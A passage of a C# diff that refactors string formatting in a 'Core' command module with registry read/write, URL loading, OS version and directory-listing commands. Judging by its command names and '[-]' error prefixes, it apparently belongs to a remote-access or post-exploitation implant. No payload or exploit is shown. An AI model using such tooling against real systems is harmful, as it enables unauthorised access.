+                Console.WriteLine($"[-] Error trying to run ls-reghkcu: {e}");
             }
         }
 
@@ -2400,7 +1732,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to run ls-reghklm: " + e);
+                Console.WriteLine($"[-] Error trying to run ls-reghklm: {e}");
             }
         }
 
@@ -2415,7 +1747,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to run ls-reg: " + e);
+                Console.WriteLine($"[-] Error trying to run ls-reg: {e}");
             }
         }
 
@@ -2430,7 +1762,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to run Reg Write: " + e);
+                Console.WriteLine($"[-] Error trying to run Reg Write: {e}");
             }
         }
 
@@ -2445,7 +1777,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to run RegRead: " + e);
+                Console.WriteLine($"[-] Error trying to run RegRead: {e}");
             }
         }
 
@@ -2460,7 +1792,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to run RegRead: " + e);
+                Console.WriteLine($"[-] Error trying to run RegRead: {e}");
             }
         }
 
@@ -2473,7 +1805,7 @@ namespace Core
                 var cver = ProcessHandler.Hook.GetCurrentVer();
                 var pname = ProcessHandler.Hook.GetProductName();
                 Console.WriteLine($"{pname} \nReleaseId {wver} \nCurrentVersion {cver}\n");
-                var osVersionInfo = new Internals.OSVersionInfoExW {dwOSVersionInfoSize = Marshal.SizeOf(typeof(Internals.OSVersionInfoExW))};
+                var osVersionInfo = new Internals.OSVersionInfoExW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(Internals.OSVersionInfoExW)) };
                 Internals.RtlGetVersion(ref osVersionInfo);
                 Console.WriteLine($"dwBuildNumber: {osVersionInfo.dwBuildNumber}");
                 Console.WriteLine($"dwMajorVersion: {osVersionInfo.dwMajorVersion}");
@@ -2536,7 +1868,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to load URL: " + e);
+                Console.WriteLine($"[-] Error trying to load URL: {e}");
             }
         }
         //////////////////////////////////
@@ -2548,7 +1880,7 @@ namespace Core
             var dirPath = "";
             if (args.Length < 2)
             {
-                dirPath = @"" + Directory.GetCurrentDirectory();
+                dirPath = $@"{Directory.GetCurrentDirectory()}";
             }
             else
             {
@@ -2557,7 +1889,7 @@ namespace Core
                 {
                     if (i >= 1)
                     {
-                        dirPath = @"" + dirPath + " " + arg.Replace("\"", "");
+                        dirPath = $@"{dirPath} {arg.Replace("\"", "")}";
                     }
 
                     i++;
@@ -2573,7 +1905,8 @@ namespace Core
                     try
                     {
                         var fInfo = new FileInfo(xx);
-                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
+                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20),
+                            fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                             fInfo.Length.ToString().PadRight(13), ("(" + fInfo.Length / 1024 + "k)").PadRight(15), fInfo.FullName);
                     }
                     catch
@@ -2597,7 +1930,8 @@ namespace Core
                     foreach (var xx in x)
                     {
                         var fInfo = new FileInfo(xx);
-                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
+                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20),
+                            fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                             fInfo.Length.ToString().PadRight(13), ("(" + fInfo.Length / 1024 + "k)").PadRight(15), fInfo.FullName);
                     }
                 }
@@ -2633,7 +1967,7 @@ namespace Core
                 files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                 foreach (var directory in Directory.GetDirectories(path))
                 {
-                    var fInfo = new DirectoryInfo(directory.Substring(1) + "\\");
+                    var fInfo = new DirectoryInfo($"{directory.Substring(1)}\\");
                     Console.WriteLine("{0} {1} {2} {3}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                         "<DIR>".PadRight(20), fInfo.FullName);
                     files.AddRange(GetFilesRecurse(directory, pattern));
@@ -2641,7 +1975,7 @@ namespace Core
             }
             catch (UnauthorizedAccessException)
             {
-                Console.WriteLine("UnauthorizedAccessException: " + path);
+                Console.WriteLine($"UnauthorizedAccessException: {path}");
             }
 
             return files;
